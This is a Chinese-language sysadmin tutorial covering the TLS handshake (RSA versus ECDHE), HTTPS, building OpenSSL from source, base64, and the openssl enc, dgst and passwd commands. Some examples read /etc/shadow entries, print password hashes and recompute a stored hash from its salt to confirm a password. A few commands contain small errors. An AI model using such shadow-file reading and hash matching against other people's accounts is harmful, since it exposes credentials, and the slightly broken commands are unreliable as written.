实现分为握手阶段和应用阶段
</p>

<ul class="org-ul">
<li>握手阶段(协商阶段)：客户端和服务器端认证对方身份（依赖于PKI体系，利用
数字证书进行身份认证），并协商通信中使用的安全参数、密码套件以及主密
钥。后续通信使用的所有密钥都是通过 MasterSecret 生成</li>
<li>应用阶段：在握手阶段完成后进入，在应用阶段通信双方使用握手阶段协商好
的密钥进行安全通信</li>
</ul>

<p>
目前密钥交换 + 签名有三种主流选择：
</p>

<ul class="org-ul">
<li>RSA 密钥交换、RSA 数字签名</li>
<li>ECDHE 密钥交换、RSA 数字签名</li>
<li>ECDHE 密钥交换、ECDSA 数字签名</li>
</ul>

<p>
<b>实现方式1</b> （了解）
</p>

<p>
RSA 密钥交换、RSA 数字签名
</p>


<figure id="org610a544">
<img src="images/image-20210120154924933.png" alt="image-20210120154924933.png" width="50%">

</figure>

<ol class="org-ol">
<li>Visitor给出协议版本号、一个客户端随机数（Client random），以及客户
端支持的加密方法</li>
<li>Server确认双方使用的加密方法，以及一个服务器生成的随机数（Server
random）</li>
<li>Server发送数字证书给Visitor</li>
<li>Visitor确认数字证书有效（查看证书状态且查询证书吊销列表），并使用信
任的CA的公钥解密数字证书获得Server的公钥，然后生成一个新的46字节随
机数（称为预备主密钥Pre-master secret），并使用Server的公钥加密预备
主密钥发给Server</li>
<li>Server使用自己的私钥，解密Visitor发来的预备主密钥</li>
<li>Visitor和Server双方都具有了(客户端随机数+服务端随机数+预备主密钥)，
它们两者都根据约定的加密方法，使用这三个随机数生成对称密钥&#x2013;主
密钥（也称为对话密钥session key），用来加密后续的对话过程</li>
<li>在双方验证完 session key 的有效性之后，SSL握手机制就算结束了。之后
所有的数据只需要使用“对话密钥”(此密钥并不是的session key，而是由
其通过计算得到)加密即可，不再需要多余的加密机制</li>
</ol>

<p>
注意：
</p>
<ol class="org-ol">
<li>在SSL握手机制中，需要三个随机数（客户端随机数+服务端随机数+预备主密钥）</li>
<li>至始至终客户端和服务端只有一次非对称加密动作-&#x2013;&#x2014;客户端使用证书中
获得的服务端公钥加密预备主密钥。</li>
<li>上述SSL握手机制的前提单向验证，无需验证客户端，如果需要验证客户端则
可能需要客户端的证书或客户端提供签名等。</li>
<li>Server和Visitor通信，Server把数字证书发给Visitor，最关键的一点是
Visitor要保证证书的有效性，通过查看证书状态并去CA的吊销列表查看
Server的证书是否被吊销。只有Server的证书可用了，才保证了第一环节的
安全性</li>
<li>RSA 密钥交换有一个很大的问题：没有前向安全性Forward Secrecy。这意味
着攻击者可以把监听到的加密流量先存起来，后续一旦拿到了私钥，之前所
有流量都可以成功解密</li>
</ol>

<p>
<b>实现方式2</b>
</p>

<p>
目前大部分 HTTPS 流量用的都是 ECDHE 密钥交换。ECDHE是使用椭圆曲线（ECC）
的 DH（DiffieHellman）算法
</p>


<figure id="org5539ccb">
<img src="images/image-20210120155014829.png" alt="image-20210120155014829.png" width="50%">

</figure>

<p>
前图中的 Server DH Parameter是用证书私钥签名的，客户端使用证书公钥就可
以验证服务端合法性。相比 RSA密钥交换，DH 由传递 Premaster Scret 变成了
传递 DH算法所需的Parameter，然后双方各自算出 Premaster Secret
</p>

<p>
对于这种情况，由于 Premaster Secret 无需交换，中间人就算有私钥也无法获
得Premaster Secret 和Master Secret。当然，使用 ECDHE后，虽然中间人拿到
私钥也无法解密之前的流量，但可以实施MITM攻击来解密之后的流量，所以私钥
还是要保管好。
</p>

<p>
相比 RSA 既可以用于密钥交换，又可以用于数字签名；ECC 这边就分得比较清
楚了：ECDHE 用于密钥交换，ECDSA 用于数字签名
</p>

<p>
浏览器f12&#x2013;安全选项可看到密钥交换 + 签名的方式
</p>


<figure id="orge2e07ac">
<img src="images/image-20210120155041380.png" alt="image-20210120155041380.png" width="50%">

</figure>
</div>
</div>
</div>
<div id="outline-container-h:31552cf6-b86c-4841-9fd3-3660f1182db4" class="outline-4">
<h4 id="h:31552cf6-b86c-4841-9fd3-3660f1182db4">HTTPS</h4>
<div class="outline-text-4" id="text-h:31552cf6-b86c-4841-9fd3-3660f1182db4">
<p>
HTTPS 协议：就是“HTTP 协议”和“SSL/TLS 协议”的组合。HTTP over SSL
或 HTTP over TLS ，对http协议的文本数据进行加密处理后，成为二进制形式
传输
</p>
</div>
<div id="outline-container-h:2d83ae51-97be-4e21-bc10-f5571bb44b4d" class="outline-5">
<h5 id="h:2d83ae51-97be-4e21-bc10-f5571bb44b4d">HTTPS 结构</h5>
<div class="outline-text-5" id="text-h:2d83ae51-97be-4e21-bc10-f5571bb44b4d">

<figure id="org7f7af3b">
<img src="images/image-20210120155104049.png" alt="image-20210120155104049.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:69652a05-d081-4988-8f97-1a43529185d6" class="outline-5">
<h5 id="h:69652a05-d081-4988-8f97-1a43529185d6">HTTPS 工作的简化过程</h5>
<div class="outline-text-5" id="text-h:69652a05-d081-4988-8f97-1a43529185d6">

<figure id="org1b75458">
<img src="images/image-20210120155123597.png" alt="image-20210120155123597.png" width="50%">

</figure>

<ol class="org-ol">
<li><p>
客户端发起HTTPS请求
</p>

<p>
用户在浏览器里输入一个https网址，然后连接到服务器的443端口
</p></li>

<li><p>
服务端的配置
</p>

<p>
采用HTTPS协议的服务器必须要有一套数字证书，可以自己制作，也可以向组
织申请。区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，
而使用受信任的公司申请的证书则不会弹出提示页面。这套证书其实就是一
对公钥和私钥
</p></li>

<li><p>
传送服务器的证书给客户端
</p>

<p>
证书里其实就是公钥，并且还包含了很多信息，如证书的颁发机构，过期时
间等等
</p></li>

<li><p>
客户端解析验证服务器证书
</p>

<p>
这部分工作是有客户端的TLS来完成的，首先会验证公钥是否有效，比如：颁
发机构，过期时间等等，如果发现异常，则会弹出一个警告框，提示证书存
在问题。如果证书没有问题，那么就生成一个随机值。然后用证书中公钥对
该随机值进行非对称加密
</p></li>

<li><p>
客户端将加密信息传送服务器
</p>

<p>
这部分传送的是用证书加密后的随机值，目的就是让服务端得到这个随机值，
以后客户端和服务端的通信就可以通过这个随机值来进行加密解密了
</p></li>

<li><p>
服务端解密信息
</p>

<p>
服务端将客户端发送过来的加密信息用服务器私钥解密后，得到了客户端传
过来的随机值
</p></li>

<li><p>
服务器加密信息并发送信息
</p>

<p>
服务器将数据利用随机值进行对称加密,再发送给客户端
</p></li>

<li><p>
客户端接收并解密信息
</p>

<p>
客户端用之前生成的随机值解密服务段传过来的数据，于是获取了解密后的
内容
</p></li>
</ol>
</div>
</div>
</div>
</div>
</section>
<section id="outline-container-h:0e76fc4e-ba1e-4081-8df2-94a5abd91d58" class="outline-2">
<h2 id="h:0e76fc4e-ba1e-4081-8df2-94a5abd91d58">OpenSSL</h2>
<div class="outline-text-2" id="text-h:0e76fc4e-ba1e-4081-8df2-94a5abd91d58">
</div>
<div id="outline-container-h:df204897-b626-4bd1-9940-64472aabbb87" class="outline-3">
<h3 id="h:df204897-b626-4bd1-9940-64472aabbb87">OpenSSL 介绍</h3>
<div class="outline-text-3" id="text-h:df204897-b626-4bd1-9940-64472aabbb87">
<p>
官网：<a href="https://www.openssl.org/">https://www.openssl.org/</a>
</p>

<p>
OpenSSL计划在1998年开始，其目标是发明一套自由的加密工具，在互联网上使
用。OpenSSL以Eric Young以及Tim Hudson两人开发的SSLeay为基础，随着两人
前往RSA公司任职，SSLeay在1998年12月停止开发。因此在1998年12月，社群另
外分支出OpenSSL，继续开发下去。
</p>

<p>
OpenSSL管理委员会当前由7人组成有13个开发人员具有提交权限（其中许多人也
是OpenSSL管理委员会的一部分）。只有两名全职员工（研究员），其余的是志
愿者。
</p>

<p>
该项目每年的预算不到100万美元，主要依靠捐款。TLS 1.3 的开发由 Akamai
赞助。
</p>

<p>
OpenSSL是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通
信，避免窃听,同时确认另一端连线者的身份。这个包广泛被应用在互联网的网
页服务器上。
</p>

<p>
其主要库是以C语言所写成，实现了基本的加密功能，实现了SSL与TLS协议。
OpenSSL可以运行在OpenVMS、Microsoft Windows以及绝大多数类Unix操作系统
上（包括Solaris，Linux，Mac OS X与各种版本的开放源代码BSD操作系统）。
</p>

<p>
<b>心脏出血漏洞</b> ：OpenSSL 1.0.1版本（不含1.0.1g）含有一个严重漏洞，可允
许攻击者读取服务器的内存信息。该漏洞于2014年4月被公诸于世，影响三分之
二的活跃网站。
</p>

<p>
包括三个组件：
</p>

<ul class="org-ul">
<li>libcrypto：用于实现加密和解密的库</li>
<li>libssl：用于实现ssl通信协议的安全库</li>
<li>openssl：多用途命令行工具</li>
</ul>
</div>
</div>
<div id="outline-container-h:04e33401-8c1f-45f5-9834-03456ff614d7" class="outline-3">
<h3 id="h:04e33401-8c1f-45f5-9834-03456ff614d7">OpenSSL 更新</h3>
<div class="outline-text-3" id="text-h:04e33401-8c1f-45f5-9834-03456ff614d7">
<div class="org-src-container">
<pre class="src src-sh">wget https://github.com/openssl/openssl/releases/download/openssl-3.4.0/openssl-3.4.0.tar.gz
tar xf openssl-3.4.0.tar.gz

<span style="color: #483d8b;">cd</span> openssl-3.4.0
./Configure --prefix=/usr/local/openssl-3.4.0 --openssldir=/usr/local/openssl-3.4.0
<span style="color: #b22222;">#</span><span style="color: #b22222;">./config --prefix=/usr/local/openssl --openssldir=/etc/ssl shared zlib enable-ssl3 enable-ssl3-method enable-mdc2 enable-md2</span>
make &amp;&amp; make install

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#26356;&#26032;&#38142;&#25509;&#21160;&#24577;&#24211;</span>
mv /usr/bin/openssl /usr/bin/openssl.bak
mv /usr/include/openssl /usr/include/openssl.bak
ln -s /usr/local/openssl-3.4.0/bin/openssl /usr/bin/openssl
ln -s /usr/local/openssl-3.4.0/include/openssl/  /usr/include/openssl
<span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'/usr/local/openssl-3.4.0/lib64'</span> &gt;&gt; /etc/ld.so.conf.d/openssl2025.conf
ldconfig <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21152;&#36733;</span>

openssl version
</pre>
</div>

<p>
perl模块依赖
</p>
<div class="org-src-container">
<pre class="src src-sh">&#26041;&#27861;&#19968;&#65306;&#30452;&#25509;&#23433;&#35013; IPC::Cmd &#27169;&#22359;
yum install -y perl-IPC-Cmd
&#26041;&#27861;&#20108;&#65306;&#36890;&#36807; CPAN &#23433;&#35013;
&#23433;&#35013; CPAN
yum install -y perl-CPAN
&#36827;&#20837; CPAN &#30340;&#20132;&#20114;&#27169;&#24335;&#65306;
perl -MCPAN -e shell
&#22312; CPAN &#30340;&#20132;&#20114;&#30028;&#38754;&#20013;&#23433;&#35013; IPC::Cmd&#65306;
install IPC::Cmd
&#23433;&#35013;&#23436;&#25104;&#21518;&#65292;&#36864;&#20986; CPAN
&#26816;&#26597;&#27169;&#22359;&#26159;&#21542;&#23433;&#35013;&#25104;&#21151;
perl -MIPC::Cmd -e 1
&#22914;&#26524;&#27809;&#26377;&#25253;&#38169;&#65292;&#21017;&#35828;&#26126;&#27169;&#22359;&#24050;&#25104;&#21151;&#23433;&#35013;
</pre>
</div>

<p>
参考：<a href="https://icxzl.com/3100.html">CentOS 7 编译安装 OpenSSL 3_升级OpenSSL</a>
</p>
</div>
</div>
<div id="outline-container-h:1836c300-93e0-43b4-9b8c-b1e10ae7dfea" class="outline-3">
<h3 id="h:1836c300-93e0-43b4-9b8c-b1e10ae7dfea">Base64 编码</h3>
<div class="outline-text-3" id="text-h:1836c300-93e0-43b4-9b8c-b1e10ae7dfea">
<p>
Base64是网络上最常见的用于传输 8Bit字节码的编码方式之一，Base64就是一
种基于64个可打印字符来表示二进制数据的方法
</p>

<div class="org-src-container">
<pre class="src src-sh">base64 &#23383;&#31526;&#21253;&#21547;a-z A-Z 0-9 + /
</pre>
</div>


<figure id="orgbd39606">
<img src="images/image-20210120185004074.png" alt="image-20210120185004074.png" width="50%">

</figure>

<p>
<b>base64的编码过程如下：</b>
</p>

<p>
将每3个字节放入一个24位的缓冲区中，最后不足3个字节的，缓冲区的剩余部分
用0来填补。然后每次取出6位（2的6次方为64，使用64个字符即可表示所有），
将高2位用0来填充，组成一个新的字节，计算出这个新字节的十进制值，对应上
面的编码表，输出相应的字符。这样不断地进行下去，就可完成对所有数据的编
码工作。
</p>

<p>
按照以上规则对文本Man编码如下：
</p>


<figure id="org6e98d7a">
<img src="images/image-20210120185027750.png" alt="image-20210120185027750.png" width="50%">

</figure>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#19977;&#20010;&#23383;&#31526;&#30340;&#25972;&#25968;&#20493;&#25165;&#19981;&#20250;&#20986;&#29616;&#31561;&#21495;</span>
[root@centos8 ~]#echo -n Man | base64
TWFu
[root@centos8 ~]#echo TWFu | base64 -d    <span style="color: #b22222;">#</span><span style="color: #b22222;">-d &#21453;&#21521;&#36716;&#25442;</span>
Man[root@centos8 ~]#

<span style="color: #b22222;"># </span><span style="color: #b22222;">echo -n Ma | base64  #&#19968;&#20010;&#23383;&#31526;&#28857;8&#20301;&#65292;base64&#26159;&#27599;&#20010;&#21344;6&#20301;&#12290;ab&#21344;16&#20301;&#65292;&#19981;&#33021;&#34987;6&#25972;&#38500;&#38656;&#35201;&#21152;&#31561;&#21495;&#20195;&#34920;&#34917;&#20986;&#26469;&#30340;0</span>
<span style="color: #a0522d;">TWE</span>=
<span style="color: #b22222;"># </span><span style="color: #b22222;">echo -n Ma | base64 |base64 -d</span>
Ma
</pre>
</div>

<p>
范例：破解下面密文
</p>

<div class="org-src-container">
<pre class="src src-sh">JXU0ZjYwJXU1OTdkJXU2NzBiJXU1M2NiJXVmZjAxJXU2MjExJXU2NjJmJXU1ZjkwJXU5NTdmJXU0ZjFm
JXVmZjBjJXU2MjExJXU3Njg0JXU3ZjUxJXU3YWQ5JXVmZjFhJXUwMDc4JXUwMDc1JXUwMDYzJXUwMDY4JXUwMDYxJXUwMDZlJXUwMDY3JXUwMDc3JXUwMDY1JXUwMDY5JXUwMDJlJXUwMDYzJXUwMDZmJXUwMDZkJXVmZjBjJXU1M2VmJXU0ZWU1
JXU1MmEwJXU0ZTJhJXU1OTdkJXU1M2NiJXU1NDE3JXVmZjFm

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35299;&#23494;</span>
cat &lt;&lt;EOF | <span style="color: #a020f0;">while </span><span style="color: #483d8b;">read</span> line; <span style="color: #a020f0;">do  </span><span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"`sed -rn 's@\%@\\\@gp' &lt;(echo $line|base64 -d)`"</span> ; <span style="color: #a020f0;">done</span>
<span style="color: #ffa54f;">JXU0ZjYwJXU1OTdkJXU2NzBiJXU1M2NiJXVmZjAxJXU2MjExJXU2NjJmJXU1ZjkwJXU5NTdmJXU0ZjFm</span>
<span style="color: #ffa54f;">JXVmZjBjJXU2MjExJXU3Njg0JXU3ZjUxJXU3YWQ5JXVmZjFhJXUwMDc4JXUwMDc1JXUwMDYzJXUwMDY4JXUwMDYxJXUwMDZlJXUwMDY3JXUwMDc3JXUwMDY1JXUwMDY5JXUwMDJlJXUwMDYzJXUwMDZmJXUwMDZkJXVmZjBjJXU1M2VmJXU0ZWU1</span>
<span style="color: #ffa54f;">JXU1MmEwJXU0ZTJhJXU1OTdkJXU1M2NiJXU1NDE3JXVmZjFm</span>
<span style="color: #ffa54f;">EOF</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21152;&#23494;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">cat &lt;&lt;EOF | while read line; do   echo  $line|iconv -f iconv -f utf-8 -t unicode |od -A n -t x2|tr -d '\n'|sed -r 's@( feff| 000a)@@g'|sed 's/\x20/\\u/g'|sed -r 's/\\/\%/g' | base64| paste -s -d ''; done</span>
&gt; &#20320;&#22909;&#26379;&#21451;&#65281;&#25105;&#26159;&#24464;&#38271;&#20255;
&gt; &#65292;&#25105;&#30340;&#32593;&#31449;&#65306;xuchangwei.com&#65292;&#21487;&#20197;
&gt; &#21152;&#20010;&#22909;&#21451;&#21527;&#65311;
&gt; EOF
JXU0ZjYwJXU1OTdkJXU2NzBiJXU1M2NiJXVmZjAxJXU2MjExJXU2NjJmJXU1ZjkwJXU5NTdmJXU0ZjFm
JXVmZjBjJXU2MjExJXU3Njg0JXU3ZjUxJXU3YWQ5JXVmZjFhJXUwMDc4JXUwMDc1JXUwMDYzJXUwMDY4JXUwMDYxJXUwMDZlJXUwMDY3JXUwMDc3JXUwMDY1JXUwMDY5JXUwMDJlJXUwMDYzJXUwMDZmJXUwMDZkJXVmZjBjJXU1M2VmJXU0ZWU1
JXU1MmEwJXU0ZTJhJXU1OTdkJXU1M2NiJXU1NDE3JXVmZjFm
</pre>
</div>
</div>
</div>
<div id="outline-container-h:3b241698-22c6-4115-adbc-a50c3539f56f" class="outline-3">
<h3 id="h:3b241698-22c6-4115-adbc-a50c3539f56f">openssl命令</h3>
<div class="outline-text-3" id="text-h:3b241698-22c6-4115-adbc-a50c3539f56f">
<p>
两种运行模式：
</p>

<ul class="org-ul">
<li>交互模式</li>
<li>批处理模式</li>
</ul>

<p>
三种子命令：
</p>

<ul class="org-ul">
<li>标准命令</li>
<li>消息摘要命令 如dgst子命令</li>
<li>加密命令 如enc子命令</li>
</ul>

<p>
范例：获取帮助
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#openssl version 
OpenSSL 1.1.1c FIPS  28 May 2019
[root@centos8 ~]#openssl help
Standard commands
asn1parse         ca                ciphers           cms               
crl               crl2pkcs7         dgst              dhparam           
dsa               dsaparam          ec                ecparam           
enc               engine            errstr            gendsa            
genpkey           genrsa            help              list              
nseq              ocsp              passwd            pkcs12            
pkcs7             pkcs8             pkey              pkeyparam         

[root@centos8 ~]#openssl 
OpenSSL&gt; help
Standard commands
asn1parse         ca                ciphers           cms               
crl               crl2pkcs7         dgst              dhparam           
......                        
OpenSSL&gt; ca --help
Usage: ca [options]
Valid options are:
 -help                   Display this summary
 -verbose                Verbose output during processing
 -config val             A config file
......
OpenSSL&gt; q
</pre>
</div>

<p>
<b>openssl密码格式</b>
</p>

<p>
子命令的选项”-passin”和”-passout”可能使用到的密码传递格式，
"-passin"指的是传递解密时的密码，"-passout"指的是传递加密输出文件时的
密码。如果不给定密码格式，将提示从终端输入。
</p>

<pre class="example" id="org5ccfc08">
格式一：pass:password   ：password表示传递的明文密码
格式二：env:var         ：从环境变量var获取密码值
格式三：file:filename   ：filename文件中的第一行为要传递的密码。若filename同时传递给"-passin"和"-passout"选项，则filename的第一行为"-passin"的值，第二行为"-passout"的值
格式四：stdin           ：从标准输入中获取要传递的密码
</pre>
</div>
<div id="outline-container-h:3e665d25-6fe6-41dc-83c0-ee01e6ea9057" class="outline-4">
<h4 id="h:3e665d25-6fe6-41dc-83c0-ee01e6ea9057">openssl enc命令对称加密</h4>
<div class="outline-text-4" id="text-h:3e665d25-6fe6-41dc-83c0-ee01e6ea9057">
<p>
工具：openssl enc, gpg
</p>

<p>
算法：3des, aes, blowfish, twofish
</p>

<p>
enc命令：帮助：man enc
</p>

<p>
加密：
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl enc -e -des3 -a -salt -in testfile -out testfile.cipher

&#21442;&#25968;&#35828;&#26126;&#65306;
-e&#65306;&#23545;&#36755;&#20837;&#25968;&#25454;&#21152;&#23494;&#65288;&#40664;&#35748;&#20540;&#65289;
-CIPHERNAME&#65306;&#34920;&#31034;&#20351;&#29992;&#30340;&#31639;&#27861; &#22914;-des3 
-a&#65306;bash64&#25991;&#26412;&#32534;&#30721;&#26684;&#24335;&#65292;&#19981;&#21152;-a&#23601;&#26159;&#20108;&#36827;&#21046;&#32534;&#30721;&#26684;&#24335;&#65307;
-salt&#65306;&#21152;&#20837;<span style="color: #8b2252;">"&#20304;&#26009;"</span>
-in&#65306;&#21152;&#23494;&#30340;&#25991;&#20214;
-out&#65306;&#21152;&#23494;&#21518;&#30340;&#25991;&#20214;
</pre>
</div>

<p>
解密：
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl enc -d -des3 -a -salt -in testfile.cipher -out testfile
<span style="color: #b22222;">#</span><span style="color: #b22222;">-d &#35299;&#23494;</span>
</pre>
</div>

<p>
范例 aes-128-cbc
</p>

<pre class="example" id="org8a200ff">
[root@test ~]# echo testsda | openssl aes-128-cbc -k 3flreaem37123456 -base64
U2FsdGVkX19PWoSmneIPSEsa42aYcs/tiFiWmmjI4tU=

[root@test ~]# echo 'U2FsdGVkX19PWoSmneIPSEsa42aYcs/tiFiWmmjI4tU=' |openssl aes-128-cbc -d -k 3flreaem37123456  -base64
testsda
</pre>
</div>
</div>
<div id="outline-container-h:b41c6355-52eb-41cb-8b14-5afe58eeb74d" class="outline-4">
<h4 id="h:b41c6355-52eb-41cb-8b14-5afe58eeb74d">openssl dgst命令单向哈希加密</h4>
<div class="outline-text-4" id="text-h:b41c6355-52eb-41cb-8b14-5afe58eeb74d">
<p>
工具：openssl dgst
</p>

<p>
算法：md5sum, sha1sum, sha224sum,sha256sum&#x2026;
</p>

<p>
dgst命令：帮助：man dgst
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl dgst -md5 [-hex&#40664;&#35748;] /PATH/SOMEFILE
openssl dgst -md5 testfile
md5sum /PATH/TO/SOMEFILE
&#33509;&#23545;&#26576;&#25991;&#20214;&#36827;&#34892;sha1&#25688;&#35201;&#35745;&#31639;&#65306;openssl sha1 -in t.txt

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25552;&#21462;fstab&#25991;&#20214;&#30340;&#29305;&#24449;&#30721;</span>
[root@centos7 scripts]# md5sum fstab   <span style="color: #b22222;">#</span><span style="color: #b22222;">md5sum&#21629;&#20196;</span>
4bc58d8550554654fb2eaf4616cfe023  fstab

[root@centos8 data]#openssl md5 fstab
<span style="color: #0000ff;">MD5</span>(fstab)= ba52d047da74624f1b009f1f73c4a54a

[root@centos7 scripts]# echo <span style="color: #8b2252;">"hello world"</span> | openssl dgst -md5  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#30452;&#25509;&#35745;&#31639;&#25968;&#25454;&#29305;&#24449;&#30721;</span>
(stdin)= 6f5902ac237024bdd0c176cb93063dc4
6
[root@centos8 data]#openssl sha512 fstab
<span style="color: #0000ff;">SHA512</span>(fstab)= 6b814b403efe8da89edc8219ffe280b857a51f19ec864880d1135da46d441d9dea40a85092515dbb42bdf823a2148ab4ba94b78e7aa0b55c439ada07069190f5

[root@centos8 data]#sha512sum fstab
6b814b403efe8da89edc8219ffe280b857a51f19ec864880d1135da46d441d9dea40a85092515dbb42bdf823a2148ab4ba94b78e7aa0b55c439ada07069190f5  fstab
</pre>
</div>

<p>
补充知识：
</p>

<blockquote>
<p>
MAC: Message Authentication Code，单向加密的一种延伸应用，用于实现网络通信中保证所传输数据的完整性机制
HMAC：hash-based MAC，使用md5或sha1算法
</p>
</blockquote>
</div>
</div>
<div id="outline-container-h:503e5e02-04d0-4af5-bb69-eb1b1cb1c672" class="outline-4">
<h4 id="h:503e5e02-04d0-4af5-bb69-eb1b1cb1c672">openssl passwd命令生成用户密码</h4>
<div class="outline-text-4" id="text-h:503e5e02-04d0-4af5-bb69-eb1b1cb1c672">
<p>
passwd命令:帮助：man sslpasswd
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">centos8</span>
[root@centos8 ~]#openssl passwd --help
Usage: passwd [options]
Valid options are:
 -help               Display this summary
 -in infile          Read passwords from file
 -noverify           Never verify when reading password from terminal
 -quiet              No warnings
 -table              Format output as table
 -reverse            Switch table columns
 -salt val           Use provided salt
 -stdin              Read passwords from stdin
 -6                  SHA512-based password algorithm
 -5                  SHA256-based password algorithm
 -apr1               MD5-based password algorithm, Apache variant
 -1                  MD5-based password algorithm
 -aixmd5             AIX MD5-based password algorithm
 -crypt              Standard Unix password algorithm (default)
 -rand val           Load the file(s) into the random number generator
 -writerand outfile  Write random data to the specified file
 &#23601;&#31639;&#23494;&#38053;&#19968;&#26679;&#65292;&#21482;&#35201;salt&#30340;&#38543;&#26426;&#25968;&#19981;&#19968;&#26679;&#65292;&#37027;&#20040;&#36755;&#20986;&#30340;&#21152;&#23494;&#23494;&#30721;&#23601;&#26159;&#19981;&#19968;&#26679;&#30340;&#65292;&#20063;&#23601;&#26080;&#27861;&#21453;&#25512;&#20986;&#23494;&#30721;
 centos7 &#19981;&#25903;&#25345;-6

<span style="color: #b22222;">#</span><span style="color: #b22222;">centos7</span>
[root@centos7 ~]# openssl passwd --help
Usage: passwd [options] [passwords]
where options are
-crypt             standard Unix password algorithm (default)
-1                 MD5-based password algorithm
-apr1              MD5-based password algorithm, Apache variant
-salt string       use provided salt
-in file           read passwords from file
-stdin             read passwords from stdin
-noverify          never verify when reading password from terminal
-quiet             no warnings
-table             format output as table
-reverse           switch table columns
</pre>
</div>

<p>
范例：适合centos8
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#getent shadow cui
cui:$<span style="color: #a0522d;">6</span>$<span style="color: #a0522d;">ARZrof3ZBlFLYESn</span>$<span style="color: #a0522d;">SrsreMQqIOTtT</span>/8NIn6w1nil/jrXY67nT3gXcs6Z9AH4iz5t4GakIJUiiu6/rnnDbNAhy68f.YBS0acCFuYT8/::0:99999:7:::

[root@centos8 ~]#echo me | openssl -6 -salt ARZrof3ZBlFLYESn -stdin
$<span style="color: #a0522d;">6</span>$<span style="color: #a0522d;">ARZrof3ZBlFLYESn</span>$<span style="color: #a0522d;">SrsreMQqIOTtT</span>/8NIn6w1nil/jrXY67nT3gXcs6Z9AH4iz5t4GakIJUiiu6/rnnDbNAhy68f.YBS0acCFuYT8/

[root@centos8 ~]#openssl passwd -6 -salt ARZrof3ZBlFLYESn meu <span style="color: #b22222;"># </span><span style="color: #b22222;">&#30452;&#25509;&#25226;&#21475;&#20196;meu&#25918;&#21518;&#38754;&#20063;&#21487;&#20197;</span>
$<span style="color: #a0522d;">6</span>$<span style="color: #a0522d;">ARZrof3ZBlFLYESn</span>$<span style="color: #a0522d;">SrsreMQqIOTtT</span>/8NIn6w1nil/jrXY67nT3gXcs6Z9AH4iz5t4GakIJUiiu6/rnnDbNAhy68f.YBS0acCFuYT8/
</pre>
</div>

<p>
范例：创建新用户同时指定密码
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#36866;&#29992;&#20110;&#32418;&#24125;&#31995;&#21015;&#30340;Linux&#29256;&#26412;</span>
[root@centos8 ~]#echo <span style="color: #8b2252;">'123456'</span> | passwd --stdin me

<span style="color: #b22222;">#</span><span style="color: #b22222;">Ubuntu &#38750;&#20132;&#20114;&#24335;&#20462;&#25913;&#29992;&#25143;&#23494;&#30721;</span>
[root@ubuntu1804 ~]#echo wang:centos |chpasswd
[root@ubuntu1804 ~]#passwd wang &lt;&lt;EOF
<span style="color: #ffa54f;">&gt; centos</span>
<span style="color: #ffa54f;">&gt; centos</span>
<span style="color: #ffa54f;">&gt; EOF</span>

<span style="color: #ffa54f;">[root@ubuntu1804 ~]#echo -e '123456\123456' | passwd wang</span>

<span style="color: #ffa54f;"># centos ubuntu&#37117;&#36866;&#29992;&#12290; ubuntu&#19981;&#25903;&#25345; passwd --stdin</span>
<span style="color: #ffa54f;">[root@centos8 ~]#useradd -p `echo meu | openssl passwd -6 -salt ARZrof3ZBlFLYESn -stdin` zhang     </span>
<span style="color: #ffa54f;">[root@centos8 ~]#getent shadow zhang</span>
<span style="color: #ffa54f;">zhang:$6$ARZrof3ZBlFLYESn$SrsreMQqIOTtT/8NIn6w1nil/jrXY67nT3gXcs6Z9AH4iz5t4GakIJUiiu6/rnnDbNAhy68f.YBS0acCFuYT8/:18402:0:99999:7:::</span>
<span style="color: #ffa54f;">[root@centos8 ~]#getent shadow zhang cui</span>
<span style="color: #ffa54f;">zhang:$6$ARZrof3ZBlFLYESn$SrsreMQqIOTtT/8NIn6w1nil/jrXY67nT3gXcs6Z9AH4iz5t4GakIJUiiu6/rnnDbNAhy68f.YBS0acCFuYT8/:18402:0:99999:7:::</span>
<span style="color: #ffa54f;">cui:$6$ARZrof3ZBlFLYESn$SrsreMQqIOTtT/8NIn6w1nil/jrXY67nT3gXcs6Z9AH4iz5t4GakIJUiiu6/rnnDbNAhy68f.YBS0acCFuYT8/::0:99999:7:::</span>

<span style="color: #ffa54f;">#  CentOS 6 &#21019;&#24314;&#24182;&#25351;&#23450;&#22522;&#20110;sha512&#30340;&#29992;&#25143;&#23494;&#30721;</span>
<span style="color: #ffa54f;">[root@centos6 ~]#grub-crypt --sha-512</span>
<span style="color: #ffa54f;">Password:</span>
<span style="color: #ffa54f;">Retype password:</span>
<span style="color: #ffa54f;">$6$v9A2/xUNwAWwEmHN$q7Wz.uscsV/8J5Gss3KslX8hKXOoaP3hDpOBWeBfMQHVIRZiwHUUkii84cvQWIMnvtnXYsdVHuLO4KhOiSOMh/</span>

<span style="color: #ffa54f;">[root@centos6 ~]#useradd -p '$6$v9A2/xUNwAWwEmHN$q7Wz.uscsV/8J5Gss3KslX8hKXOoaP3hDpOBWeBfMQHVIRZiwHUUkii84cvQWIMnvtnXYsdVHuLO4KhOiSOMh/' test</span>

<span style="color: #ffa54f;">[root@centos6 ~]#getent shadow test</span>
<span style="color: #ffa54f;">test:$6$v9A2/xUNwAWwEmHN$q7Wz.uscsV/8J5Gss3KslX8hKXOoaP3hDpOBWeBfMQHVIRZiwHUUkii84cvQWIMnvtnXYsdVHuLO4KhOiSOMh/:18459:0:99999:7:::</span>

